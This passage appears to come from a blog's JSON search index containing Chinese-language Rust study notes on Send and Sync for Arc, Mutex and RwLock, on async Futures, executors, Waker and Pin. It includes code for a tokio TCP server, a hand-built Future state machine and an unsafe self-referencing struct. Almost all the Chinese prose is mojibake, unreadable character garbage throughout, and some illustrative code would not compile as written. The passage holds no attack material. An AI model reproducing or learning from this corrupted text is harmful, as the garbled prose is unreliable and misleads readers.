dropï¼Œéœ€è¦ä¿è¯å¼•ç”¨åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…æœ‰æ•ˆï¼‰ï¼Œå› ä¸º &amp;mut T å¯ä»¥é€šè¿‡ *ref = T æ¥è¦†å†™å…¶æ•´ä¸ªæ•°æ®ï¼ˆåŸæ•°æ®è¢« dropï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ std::mem::replace å°†å…¶æŒ‡å‘çš„åŸæ•°æ® move èµ°ã€‚æ‰€ä»¥ &amp;mut T æ˜¯ Send çš„å‰ææ˜¯ T å¿…é¡»å¯ä»¥åœ¨çº¿ç¨‹é—´å®‰å…¨åœ° moveï¼Œå³ T ä¸º Sendã€‚ Send ä¸ Sync ç¤ºä¾‹ Send + Sync ç»å¤§å¤šæ•° primitives ç±»å‹ï¼šboolã€i32ã€array Atomic ç±»å‹ï¼šAtomicBoolã€AtomicI32 åŸºäº Send + Sync ç±»å‹æ„å»ºçš„ structã€tupleã€enum Arc: unsafe impl&lt;T: ?Sized + Sync + Send, A: Allocator + Sync&gt; Sync for Arc&lt;T, A&gt; {}, unsafe impl&lt;T: ?Sized + Sync + Send, A: Allocator + Send&gt; Send for Arc&lt;T, A&gt; {} å› ä¸º Arc æ˜¯å…±äº«æ‰€æœ‰æƒï¼Œå› æ­¤ä¸ç¡®å®š T æœ€ç»ˆä¼šåœ¨å“ªä¸ªçº¿ç¨‹ä¸Šè¢« dropï¼Œå› æ­¤ Arc æ˜¯ Send çš„å‰æä¹‹ä¸€æ˜¯ T æ˜¯ Send Arc å¯ä»¥é€šè¿‡ Deref æ‹¿åˆ° &amp;Tï¼Œå› æ­¤åœ¨çº¿ç¨‹é—´å‘é€ Arc ç­‰ä»·äºå‘é€ &amp;Tï¼Œè€Œ &amp;T å¯ä»¥è¢«å®‰å…¨å‘é€çš„å‰ææ˜¯ T å¿…é¡»æ˜¯ Sync åœ¨çº¿ç¨‹é—´å‘é€ Arc æˆ–å…¶å¼•ç”¨ &amp;Arc æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºä¸¤è€…éƒ½å¯ä»¥é€šè¿‡ clone æ‹¿åˆ°ä¸€ä¸ªæ–°çš„ Arc Mutex: unsafe impl&lt;T: ?Sized + Send&gt; Send for Mutex&lt;T&gt; {}, unsafe impl&lt;T: ?Sized + Send&gt; Sync for Mutex&lt;T&gt; {} å¦‚æœ T ä¸æ˜¯ Sendï¼Œé‚£ä¹ˆ Mutex è¢«å‘é€åˆ°å…¶ä»–çº¿ç¨‹åè·å–é” MutexGuardï¼Œè¿›è€Œé€šè¿‡ DerefMut è·å–åˆ° &amp;mut Tï¼Œè€Œ &amp;mut T å¯ä»¥å°†å…¶åŸå€¼ drop æˆ–è€… moveï¼Œå­˜åœ¨é—®é¢˜ã€‚å› æ­¤ T å¿…é¡» Sendï¼ŒMutex æ‰ä¼šæ˜¯ Send å¦‚æœ T ä¸æ˜¯ Sendï¼Œé‚£ä¹ˆ Mutex çš„å¼•ç”¨è¢«å…±äº«åˆ°å…¶ä»–çº¿ç¨‹åä»èƒ½è·å–é” MutexGuardï¼Œè¿›è€Œé€šè¿‡ DerefMut è·å–åˆ° &amp;mut Tï¼Œè€Œ &amp;mut T å¯ä»¥å°†å…¶åŸå€¼ drop æˆ–è€… moveï¼Œå­˜åœ¨é—®é¢˜ã€‚å› æ­¤ T å¿…é¡» Sendï¼ŒMutex æ‰ä¼šæ˜¯ Sync RwLock: unsafe impl&lt;T: ?Sized + Send&gt; Send for RwLock&lt;T&gt; {}, unsafe impl&lt;T: ?Sized + Send + Sync&gt; Sync for RwLock&lt;T&gt; {} å¦‚æœ T ä¸æ˜¯ Sendï¼Œé‚£ä¹ˆ RwLock è¢«å‘é€åˆ°å…¶ä»–çº¿ç¨‹åè·å–å†™é” RwLockWriteGuardï¼Œè¿›è€Œé€šè¿‡ DerefMut è·å–åˆ° &amp;mut Tï¼Œè€Œ &amp;mut T å¯ä»¥å°†å…¶åŸå€¼ drop æˆ–è€… moveï¼Œå­˜åœ¨é—®é¢˜ã€‚å› æ­¤ T å¿…é¡» Sendï¼ŒRwLock æ‰ä¼šæ˜¯ Send å¦‚æœ T ä¸æ˜¯ Sendï¼Œé‚£ä¹ˆ RwLock çš„å¼•ç”¨è¢«å…±äº«åˆ°å…¶ä»–çº¿ç¨‹åä»èƒ½è·å–å†™é” RwLockWriteGuardï¼Œè¿›è€Œé€šè¿‡ DerefMut è·å–åˆ° &amp;mut Tï¼Œè€Œ &amp;mut T å¯ä»¥å°†å…¶åŸå€¼ drop æˆ–è€… moveï¼Œå­˜åœ¨é—®é¢˜ã€‚å› æ­¤ T å¿…é¡» Sendï¼ŒRwLock æ‰ä¼šæ˜¯ Sync å¦‚æœ T ä¸æ˜¯ Syncï¼Œé‚£ä¹ˆ RwLock çš„å¼•ç”¨è¢«å…±äº«åˆ°å…¶ä»–çº¿ç¨‹åå¯èƒ½å¤šä¸ªçº¿ç¨‹åŒæ—¶è·å–åˆ°è¯»é” RwLockReadGuardï¼Œè¿›è€Œé€šè¿‡ Deref è·å–åˆ° &amp;Tï¼Œè€Œ T ä¸æ˜¯ Sync çš„è¯ï¼Œé‚£ä¹ˆå¤šçº¿ç¨‹åŒæ—¶ä½¿ç”¨ &amp;T å­˜åœ¨é—®é¢˜ã€‚å› æ­¤ T å¿…é¡» Syncï¼ŒRwLock æ‰ä¼šæ˜¯ Sync Send + !Sync Cell å’Œ RefCellï¼Œå…¶æ‹¥æœ‰å†…éƒ¨å¯å˜æ€§ï¼Œä½†å¹¶æ²¡æœ‰ä½¿ç”¨åŒæ­¥æœºåˆ¶ !Send + Sync MutexGuardï¼Œå¿…é¡»åœ¨åŠ é”çš„çº¿ç¨‹ä¸Šå»é‡Šæ”¾é”ï¼ˆå‘ç”Ÿåœ¨ drop æ—¶ï¼‰ï¼Œå› æ­¤ä¸èƒ½ Send åˆ°å…¶ä»–çº¿ç¨‹ä¸Šè¢« dropã€‚MutexGuard å¯ä»¥é€šè¿‡ DerefMut è·å– &amp;mut Tï¼Œå› æ­¤å½“ T æ˜¯ Sync æ—¶ï¼ŒMutexGuard æ‰æ˜¯ Syncï¼ˆimpl&lt;T: ?Sized + Sync&gt; Sync for MutexGuard&lt;'_, T&gt;ï¼‰ !Send + !Sync Rcï¼Œå…¶å†…éƒ¨å¼•ç”¨è®¡æ•°éåŸå­æ›´æ–°ï¼ŒRc å’Œ &amp;Rc å‡æ— æ³•å‘é€åˆ°å…¶ä»–çº¿ç¨‹ï¼Œå› ä¸ºä¸¤è€…éƒ½å¯ä»¥é€šè¿‡ clone æ”¹å˜å†…éƒ¨å¼•ç”¨è®¡æ•°å™¨ ref: SystemX Labs","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST-Async","slug":"RUST-Async","date":"2025-01-05T13:50:19.000Z","updated":"2025-02-06T14:35:20.366Z","comments":true,"path":"posts/b9534ecc.html","link":"","permalink":"https://racleray.github.io/posts/b9534ecc.html","excerpt":"Rust Notes","text":"async å®šä¹‰äº†ä¸€ä¸ªå¯ä»¥å¹¶å‘æ‰§è¡Œçš„ä»»åŠ¡ï¼Œè€Œ await åˆ™è§¦å‘è¿™ä¸ªä»»åŠ¡å¹¶å‘æ‰§è¡Œã€‚å¤§å¤šæ•°è¯­è¨€ï¼ŒåŒ…æ‹¬ Rustï¼Œasync/await éƒ½æ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼ˆsyntactic sugarï¼‰ï¼Œå®ƒä»¬ä½¿ç”¨çŠ¶æ€æœºå°† Promise/Future è¿™æ ·çš„ç»“æ„åŒ…è£…èµ·æ¥è¿›è¡Œå¤„ç†ã€‚ JavaScript çš„ Promise å’Œçº¿ç¨‹ç±»ä¼¼ï¼Œä¸€æ—¦åˆ›å»ºå°±å¼€å§‹æ‰§è¡Œï¼Œå¯¹ Promise await åªæ˜¯ä¸ºäº†è·å–è§£æå‡ºæ¥çš„å€¼ï¼›è€Œ Rust çš„ Futureï¼Œåªæœ‰åœ¨ä¸»åŠ¨ await åæ‰å¼€å§‹æ‰§è¡Œã€‚ Future å¼‚æ­¥å‡½æ•°ï¼ˆasync fnï¼‰çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå¥‡æ€ªçš„ impl Future çš„ç»“æ„ 123456789pub trait Future &#123; type Output; fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt;;&#125;pub enum Poll&lt;T&gt; &#123; Ready(T), Pending,&#125; å¯¹äºçº¿ç¨‹æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£è°ƒåº¦ï¼›ä½†æ“ä½œç³»ç»Ÿä¸ä¼šå»è°ƒåº¦ç”¨æˆ·æ€çš„åç¨‹ï¼ˆæ¯”å¦‚ Futureï¼‰ï¼Œä»»ä½•ä½¿ç”¨äº†åç¨‹æ¥å¤„ç†å¹¶å‘çš„ç¨‹åºï¼Œéƒ½éœ€è¦æœ‰ä¸€ä¸ª executor æ¥è´Ÿè´£åç¨‹çš„è°ƒåº¦ã€‚ å¸¸è§çš„ executor æœ‰ futures, tokio, async-std ç­‰ã€‚ Reactor ä¸å¼‚æ­¥å¤„ç† Reactor pattern å®ƒåŒ…å«ä¸‰éƒ¨åˆ†ï¼š taskï¼Œå¾…å¤„ç†çš„ä»»åŠ¡ã€‚ä»»åŠ¡å¯ä»¥è¢«æ‰“æ–­ï¼Œå¹¶ä¸”æŠŠæ§åˆ¶æƒäº¤ç»™ executorï¼Œç­‰å¾…ä¹‹åçš„è°ƒåº¦ï¼› executorï¼Œä¸€ä¸ªè°ƒåº¦å™¨ã€‚ç»´æŠ¤ç­‰å¾…è¿è¡Œçš„ä»»åŠ¡ï¼ˆready queueï¼‰ï¼Œä»¥åŠè¢«é˜»å¡çš„ä»»åŠ¡ï¼ˆwait queueï¼‰ï¼› reactorï¼Œç»´æŠ¤äº‹ä»¶é˜Ÿåˆ—ã€‚å½“äº‹ä»¶æ¥ä¸´æ—¶ï¼Œé€šçŸ¥ executor å”¤é†’æŸä¸ªä»»åŠ¡ç­‰å¾…è¿è¡Œã€‚ Future æ˜¯å¼‚æ­¥ä»»åŠ¡çš„æ•°æ®ç»“æ„ï¼Œå½“ fut.await æ—¶ï¼Œexecutor å°±ä¼šè°ƒåº¦å¹¶æ‰§è¡Œå®ƒã€‚ tokio çš„è°ƒåº¦å™¨ï¼ˆexecutorï¼‰ä¼šè¿è¡Œåœ¨å¤šä¸ªçº¿ç¨‹ä¸Šï¼Œè¿è¡Œçº¿ç¨‹è‡ªå·±çš„ ready queue ä¸Šçš„ä»»åŠ¡ï¼ˆFutureï¼‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±å»åˆ«çš„çº¿ç¨‹çš„è°ƒåº¦å™¨ä¸Š stealing ä¸€äº›è¿‡æ¥è¿è¡Œï¼ˆtokio å®ç°äº† work stealing schedulerï¼‰ã€‚å½“æŸä¸ªä»»åŠ¡æ— æ³•å†ç»§ç»­å–å¾—è¿›å±•ï¼Œæ­¤æ—¶ Future è¿è¡Œçš„ç»“æœæ˜¯ Poll::Pendingï¼Œé‚£ä¹ˆè°ƒåº¦å™¨ä¼šæŒ‚èµ·ä»»åŠ¡ï¼Œå¹¶è®¾ç½®å¥½åˆé€‚çš„å”¤é†’æ¡ä»¶ï¼ˆWakerï¼‰ï¼Œç­‰å¾…è¢« reactor å”¤é†’ã€‚ reactor ä¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„å¼‚æ­¥ I/Oï¼Œæ¯”å¦‚ epoll / kqueue / IOCPï¼Œæ¥ç›‘å¬æ“ä½œç³»ç»Ÿæä¾›çš„ IO äº‹ä»¶ï¼Œå½“é‡åˆ°æ»¡è¶³æ¡ä»¶çš„äº‹ä»¶æ—¶ï¼Œå°±ä¼šè°ƒç”¨ Waker.wake() å”¤é†’è¢«æŒ‚èµ·çš„ Futureã€‚è¿™ä¸ª Future ä¼šå›åˆ° ready queue ç­‰å¾…æ‰§è¡Œã€‚ å¼‚æ­¥ä½¿ç”¨ç¯å¢ƒ éè®¡ç®—å¯†é›†å‹ Future çš„è°ƒåº¦æ˜¯åä½œå¼å¤šä»»åŠ¡ï¼ˆCooperative Multitaskingï¼‰ï¼Œé™¤é Future ä¸»åŠ¨æ”¾å¼ƒ CPUï¼Œä¸ç„¶å®ƒå°±ä¼šä¸€ç›´è¢«æ‰§è¡Œï¼Œç›´åˆ°è¿è¡Œç»“æŸã€‚ å¦‚æœä½ çš„ç¡®éœ€è¦åœ¨ tokioï¼ˆæˆ–è€…å…¶å®ƒå¼‚æ­¥è¿è¡Œæ—¶ï¼‰ä¸‹è¿è¡Œè¿ç®—é‡å¾ˆå¤§çš„ä»£ç ï¼Œé‚£ä¹ˆæœ€å¥½ä½¿ç”¨ yield æ¥ä¸»åŠ¨è®©å‡º CPUï¼Œæ¯”å¦‚ tokio::task::yield_now()ï¼Œé¿å…æŸä¸ªè®¡ç®—å¯†é›†å‹çš„ä»»åŠ¡é¥¿æ­»å…¶å®ƒä»»åŠ¡ã€‚ é std mutex å¤§éƒ¨åˆ†æ—¶å€™ï¼Œæ ‡å‡†åº“çš„ Mutex å¯ä»¥ç”¨åœ¨å¼‚æ­¥ä»£ç ä¸­ï¼Œè€Œä¸”ï¼Œè¿™æ˜¯æ¨èçš„ç”¨æ³•ã€‚ ç„¶è€Œï¼Œæ ‡å‡†åº“çš„ MutexGuard ä¸èƒ½å®‰å…¨åœ°è·¨è¶Š awaitï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬éœ€è¦è·å¾—é”ä¹‹åæ‰§è¡Œå¼‚æ­¥æ“ä½œï¼Œå¿…é¡»ä½¿ç”¨ tokio è‡ªå¸¦çš„ Mutexã€‚ å› ä¸º tokio å®ç°äº† work-stealing è°ƒåº¦ï¼ŒFuture æœ‰å¯èƒ½åœ¨ä¸åŒçš„çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œæ™®é€šçš„ MutexGuard ç¼–è¯‘ç›´æ¥å°±ä¼šå‡ºé”™ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ tokio çš„ Mutexã€‚ çº¿ç¨‹ä¸å¼‚æ­¥ä»»åŠ¡çš„åŒæ­¥ å…¼æœ‰è®¡ç®—å¯†é›†å’Œ IO å¯†é›†çš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ channel æ¥åœ¨çº¿ç¨‹å’Œfutureä¸¤è€…ä¹‹é—´åšåŒæ­¥ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788use std::thread;use anyhow::Result;use blake3::Hasher;use futures::&#123;SinkExt, StreamExt&#125;;use rayon::prelude::*;use tokio::&#123; net::TcpListener, sync::&#123;mpsc, oneshot&#125;,&#125;;use tokio_util::codec::&#123;Framed, LinesCodec&#125;;pub const PREFIX_ZERO: &amp;[u8] = &amp;[0, 0, 0];#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let addr = \"0.0.0.0:8080\"; let listener = TcpListener::bind(addr).await?; println!(\"listen to: &#123;&#125;\", addr); // åˆ›å»º tokio task å’Œ thread ä¹‹é—´çš„ channel let (sender, mut receiver) = mpsc::unbounded_channel::&lt;(String, oneshot::Sender&lt;String&gt;)&gt;(); // ä½¿ç”¨ thread å¤„ç†è®¡ç®—å¯†é›†å‹ä»»åŠ¡ thread::spawn(move || &#123; // è¯»å–ä» tokio task è¿‡æ¥çš„ msgï¼Œè¿™é‡Œç”¨çš„æ˜¯ blocking_recvï¼Œè€Œé await while let Some((line, reply)) = receiver.blocking_recv() &#123; // è®¡ç®— pow let result = match pow(&amp;line) &#123; Some((hash, nonce)) =&gt; format!(\"hash: &#123;&#125;, once: &#123;&#125;\", hash, nonce), None =&gt; \"Not found\".to_string(), &#125;; // æŠŠè®¡ç®—ç»“æœä» oneshot channel é‡Œå‘å› if let Err(e) = reply.send(result) &#123; println!(\"Failed to send: &#123;&#125;\", e); &#125; &#125; &#125;); // ä½¿ç”¨ tokio task å¤„ç† IO å¯†é›†å‹ä»»åŠ¡ loop &#123; let (stream, addr) = listener.accept().await?; println!(\"Accepted: &#123;:?&#125;\", addr); let sender1 = sender.clone(); tokio::spawn(async move &#123; // ä½¿ç”¨ LinesCodec æŠŠ TCP æ•°æ®åˆ‡æˆä¸€è¡Œè¡Œå­—ç¬¦ä¸²å¤„ç† let framed = Framed::new(stream, LinesCodec::new()); // split æˆ writer å’Œ reader let (mut w, mut r) = framed.split(); for line in r.next().await &#123; // ä¸ºæ¯ä¸ªæ¶ˆæ¯åˆ›å»ºä¸€ä¸ª oneshot channel let (reply, reply_receiver) = oneshot::channel(); sender1.send((line?, reply))?; if let Ok(v) = reply_receiver.await &#123; w.send(format!(\"Pow calculated: &#123;&#125;\", v)).await?; &#125; &#125; Ok::&lt;_, anyhow::Error&gt;(()) &#125;); &#125;&#125;pub fn pow(s: &amp;str) -&gt; Option&lt;(String, u32)&gt; &#123; let hasher = blake3_base_hash(s.as_bytes()); // ä½¿ç”¨ rayon å¹¶å‘è®¡ç®— u32 ç©ºé—´ä¸‹æ‰€æœ‰ nonceï¼Œç›´åˆ°æ‰¾åˆ°æœ‰å¤´ N ä¸ª 0 çš„å“ˆå¸Œ let nonce = (0..u32::MAX).into_par_iter().find_any(|n| &#123; let hash = blake3_hash(hasher.clone(), n).as_bytes().to_vec(); &amp;hash[..PREFIX_ZERO.len()] == PREFIX_ZERO &#125;); nonce.map(|n| &#123; let hash = blake3_hash(hasher, &amp;n).to_hex().to_string(); (hash, n) &#125;)&#125;// è®¡ç®—æºå¸¦ nonce åçš„å“ˆå¸Œfn blake3_hash(mut hasher: blake3::Hasher, nonce: &amp;u32) -&gt; blake3::Hash &#123; hasher.update(&amp;nonce.to_be_bytes()[..]); hasher.finalize()&#125;// è®¡ç®—æ•°æ®çš„å“ˆå¸Œfn blake3_base_hash(data: &amp;[u8]) -&gt; Hasher &#123; let mut hasher = Hasher::new(); hasher.update(data); hasher&#125; Waker executor é€šè¿‡è°ƒç”¨ poll æ–¹æ³•æ¥è®© Future ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå¦‚æœ poll æ–¹æ³•è¿”å› Poll::Pendingï¼Œå°±é˜»å¡ Futureï¼Œç›´åˆ° reactor æ”¶åˆ°äº†æŸä¸ªäº‹ä»¶ï¼Œç„¶åè°ƒç”¨ Waker.wake() æŠŠ Future å”¤é†’ã€‚ Context å°±æ˜¯ Waker çš„ä¸€ä¸ªå°è£…: 1234pub struct Context&lt;'a&gt; &#123; waker: &amp;'a Waker, _marker: PhantomData&lt;fn(&amp;'a ()) -&gt; &amp;'a ()&gt;,&#125; å†…éƒ¨ä½¿ç”¨äº†ä¸€ä¸ª vtable æ¥å…è®¸çš„ waker çš„è¡Œä¸ºï¼š 123456pub struct RawWakerVTable &#123; clone: unsafe fn(*const ()) -&gt; RawWaker, wake: unsafe fn(*const ()), wake_by_ref: unsafe fn(*const ()), drop: unsafe fn(*const ()),&#125; åœ¨æ ‡å‡†åº“ä¸­ï¼Œåªæœ‰è¿™äº›æ¥å£çš„å®šä¹‰ï¼Œä»¥åŠâ€œé«˜å±‚â€æ¥å£çš„å®ç°ï¼Œæ¯”å¦‚ Waker ä¸‹çš„ wake æ–¹æ³•ï¼Œåªæ˜¯è°ƒç”¨äº† vtable é‡Œçš„ wake() è€Œå·²ï¼š 12345678910111213141516171819impl Waker &#123; /// Wake up the task associated with this `Waker`. #[inline] pub fn wake(self) &#123; // The actual wakeup call is delegated through a virtual function call // to the implementation which is defined by the executor. let wake = self.waker.vtable.wake; let data = self.waker.data; // Don't call `drop` -- the waker will be consumed by `wake`. crate::mem::forget(self); // SAFETY: This is safe because `Waker::from_raw` is the only way // to initialize `wake` and `data` requiring the user to acknowledge // that the contract of `RawWaker` is upheld. unsafe &#123; (wake)(data) &#125;; &#125; ...&#125; å…·ä½“çš„å®ç°å¯å‚çœ‹ futures-rs/waker.rsã€‚ Poll executor å¤„ç† Future æ—¶ï¼Œä¼šä¸æ–­åœ°è°ƒç”¨å®ƒçš„ poll() æ–¹æ³•ï¼š 123456789101112131415161718192021hello().await?;// ç­‰ä»·äºmatch hello.poll(cx) &#123; Poll::Ready(result) =&gt; return result, Poll::Pending =&gt; return Poll::Pending&#125;hello(inner1.await, inner2.await).await?; // inner1 conditioned by inner2let fut = inner1;match fut.poll(cx) &#123; Poll::Ready(Ok(file)) =&gt; &#123; let fut = inner2; match fut.poll(cx) &#123; Poll::Ready(result) =&gt; return result, Poll::Pending =&gt; return Poll::Pending, &#125; &#125; Poll::Pending =&gt; return Poll::Pending,&#125; async å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª Futureï¼Œæ‰€ä»¥ï¼Œè¿˜éœ€è¦æŠŠè¿™æ ·çš„ä»£ç å°è£…åœ¨ä¸€ä¸ª Future çš„å®ç°é‡Œï¼Œå¯¹å¤–æä¾›å‡ºå»ã€‚ éœ€è¦å®ç°ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒæŠŠå†…éƒ¨çš„çŠ¶æ€ä¿å­˜èµ·æ¥ï¼Œå¹¶ä¸ºè¿™ä¸ªæ•°æ®ç»“æ„å®ç° Futureã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657enum WriteHelloFile &#123; Init(String), // ç­‰å¾…æ–‡ä»¶åˆ›å»ºï¼Œæ­¤æ—¶éœ€è¦ä¿å­˜ Future ä»¥ä¾¿å¤šæ¬¡è°ƒç”¨ AwaitingCreate(impl Future&lt;Output = Result&lt;fs::File, std::io::Error&gt;&gt;), // ç­‰å¾…æ–‡ä»¶å†™å…¥ï¼Œæ­¤æ—¶éœ€è¦ä¿å­˜ Future ä»¥ä¾¿å¤šæ¬¡è°ƒç”¨ AwaitingWrite(impl Future&lt;Output = Result&lt;(), std::io::Error&gt;&gt;), Done,&#125;impl WriteHelloFile &#123; pub fn new(name: impl Into&lt;String&gt;) -&gt; Self &#123; Self::Init(name.into()) &#125;&#125;impl Future for WriteHelloFile &#123; type Output = Result&lt;(), std::io::Error&gt;; fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt; &#123; let this = self.get_mut(); loop &#123; match this &#123; // å¦‚æœçŠ¶æ€æ˜¯ Initï¼Œé‚£ä¹ˆå°±ç”Ÿæˆ create Futureï¼ŒæŠŠçŠ¶æ€åˆ‡æ¢åˆ° AwaitingCreate WriteHelloFile::Init(name) =&gt; &#123; let fut = fs::File::create(name); *self = WriteHelloFile::AwaitingCreate(fut); &#125; // å¦‚æœçŠ¶æ€æ˜¯ AwaitingCreateï¼Œé‚£ä¹ˆ poll create Future // å¦‚æœè¿”å› Poll::Ready(Ok(_))ï¼Œé‚£ä¹ˆåˆ›å»º write Future // å¹¶æŠŠçŠ¶æ€åˆ‡æ¢åˆ° Awaiting WriteHelloFile::AwaitingCreate(fut) =&gt; match fut.poll(cx) &#123; Poll::Ready(Ok(file)) =&gt; &#123; let fut = file.write_all(b\"hello world!\"); *self = WriteHelloFile::AwaitingWrite(fut); &#125; Poll::Ready(Err(e)) =&gt; return Poll::Ready(Err(e)), Poll::Pending =&gt; return Poll::Pending, &#125;, // å¦‚æœçŠ¶æ€æ˜¯ AwaitingWriteï¼Œé‚£ä¹ˆ poll write Future // å¦‚æœè¿”å› Poll::Ready(_)ï¼Œé‚£ä¹ˆçŠ¶æ€åˆ‡æ¢åˆ° Doneï¼Œæ•´ä¸ª Future æ‰§è¡ŒæˆåŠŸ WriteHelloFile::AwaitingWrite(fut) =&gt; match fut.poll(cx) &#123; Poll::Ready(result) =&gt; &#123; *self = WriteHelloFile::Done; return Poll::Ready(result); &#125; Poll::Pending =&gt; return Poll::Pending, &#125;, // æ•´ä¸ª Future å·²ç»æ‰§è¡Œå®Œæ¯• WriteHelloFile::Done =&gt; return Poll::Ready(Ok(())), &#125; &#125; &#125;&#125;fn write_hello_file_async(name: &amp;str) -&gt; WriteHelloFile &#123; WriteHelloFile::new(name)&#125; Rust åœ¨ç¼–è¯‘ async fn æˆ–è€… async block æ—¶ï¼Œå°±ä¼šç”Ÿæˆç±»ä¼¼çš„çŠ¶æ€æœºçš„å®ç°ã€‚ Pin åœ¨ä¸Šé¢å®ç° Future çš„çŠ¶æ€æœºä¸­ï¼ŒAwaitingCreate å¼•ç”¨äº† file è¿™æ ·ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼š file è¢« fut å¼•ç”¨ï¼Œä½† file ä¼šåœ¨è¿™ä¸ªä½œç”¨åŸŸè¢«ä¸¢å¼ƒã€‚éœ€è¦æŠŠå®ƒä¿å­˜åœ¨æ•°æ®ç»“æ„ä¸­ï¼š 1234567891011enum WriteHelloFile &#123; Init(String), AwaitingCreate(impl Future&lt;Output = Result&lt;fs::File, std::io::Error&gt;&gt;), AwaitingWrite(AwaitingWriteData), Done,&#125;struct AwaitingWriteData &#123; fut: impl Future&lt;Output = Result&lt;(), std::io::Error&gt;&gt;, file: fs::File,&#125; åœ¨åŒä¸€ä¸ªæ•°æ®ç»“æ„å†…éƒ¨ï¼Œfut æŒ‡å‘äº†å¯¹ file çš„å¼•ç”¨ï¼Œå½¢æˆè‡ªå¼•ç”¨ç»“æ„ï¼ˆSelf-Referential Structureï¼‰ã€‚ è‡ªå¼•ç”¨ç»“æ„æœ‰ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜æ˜¯ï¼šä¸€æ—¦å®ƒè¢«ç§»åŠ¨ï¼ŒåŸæœ¬çš„æŒ‡é’ˆå°±ä¼šæŒ‡å‘æ—§çš„åœ°å€ã€‚å³ï¼Œfut ä¼šåœ¨ç§»åŠ¨åæŒ‡å‘ç§»åŠ¨å‰çš„ fileã€‚ Pin æ‹¿ä½çš„æ˜¯ä¸€ä¸ªå¯ä»¥è§£å¼•ç”¨æˆ T çš„æŒ‡é’ˆç±»å‹ Pï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹¿åŸæœ¬çš„ç±»å‹ Tã€‚æ‰€ä»¥ï¼Œå¯¹äº Pin è€Œè¨€ï¼Œéƒ½æ˜¯ Pin&lt;Box&gt;ã€Pin&lt;&amp;mut T&gt;ï¼Œä½†ä¸ä¼šæ˜¯ Pinã€‚å› ä¸º Pin çš„ç›®çš„æ˜¯ï¼ŒæŠŠ T çš„å†…å­˜ä½ç½®é”ä½ï¼Œä»è€Œé¿å…ç§»åŠ¨åè‡ªå¼•ç”¨ç±»å‹å¸¦æ¥çš„å¼•ç”¨å¤±æ•ˆé—®é¢˜ã€‚ æ­¤å¤„ Pin çš„ AwaitingWriteData å¼•ç”¨ï¼ŒæŒ‡å‘åŒä¸€ä¸ªå†…å­˜ä½ç½®ã€‚ è‡ªå¼•ç”¨æ•°æ®ç»“æ„å¹¶éåªåœ¨å¼‚æ­¥ä»£ç é‡Œå‡ºç°ï¼Œåªä¸è¿‡å¼‚æ­¥ä»£ç åœ¨å†…éƒ¨ç”Ÿæˆç”¨çŠ¶æ€æœºè¡¨è¿°çš„ Future æ—¶ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿè‡ªå¼•ç”¨ç»“æ„ã€‚æ¯”å¦‚ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#[derive(Debug)]struct SelfReference &#123; name: String, // åœ¨åˆå§‹åŒ–åæŒ‡å‘ name name_ptr: *const String,&#125;impl SelfReference &#123; pub fn new(name: impl Into&lt;String&gt;) -&gt; Self &#123; SelfReference &#123; name: name.into(), name_ptr: std::ptr::null(), &#125; &#125; pub fn init(&amp;mut self) &#123; self.name_ptr = &amp;self.name as *const String; &#125; pub fn print_name(&amp;self) &#123; println!( \"struct &#123;:p&#125;: (name: &#123;:p&#125; name_ptr: &#123;:p&#125;), name: &#123;&#125;, name_ref: &#123;&#125;\", self, &amp;self.name, self.name_ptr, self.name, // åœ¨ä½¿ç”¨ ptr æ˜¯éœ€è¦ unsafe // SAFETY: è¿™é‡Œ name_ptr æ½œåœ¨ä¸å®‰å…¨ï¼Œä¼šæŒ‡å‘æ—§çš„ä½ç½® unsafe &#123; &amp;*self.name_ptr &#125;, ); &#125;&#125;// memcpyfn move_it(data: SelfReference) -&gt; SelfReference &#123; data&#125;fn move_creates_issue() -&gt; SelfReference &#123; let mut data = SelfReference::new(\"Tyr\"); data.init(); // ä¸ moveï¼Œä¸€åˆ‡æ­£å¸¸ data.print_name(); let data = move_it(data); // move ä¹‹åï¼Œname_ref æŒ‡å‘çš„ä½ç½®æ˜¯å·²ç»å¤±æ•ˆçš„åœ°å€ // åªä¸è¿‡ç°åœ¨ move å‰çš„åœ°å€è¿˜æ²¡è¢«å›æ”¶ data.print_name(); data&#125;fn mem_swap_creates_issue() &#123; let mut data1 = SelfReference::new(\"Tyr\"); data1.init(); let mut data2 = SelfReference::new(\"Lindsey\"); data2.init(); // name: Tyr, name_ref: Tyr data1.print_name(); // name: Lindsey, name_ref: Lindsey data2.print_name(); std::mem::swap(&amp;mut data1, &amp;mut data2); // name: Lindsey, name_ref: Tyr data1.print_name(); // name: Tyr, name_ref: Lindsey data2.print_name();&#125;fn main() &#123; let data = move_creates_issue(); println!(\"data: 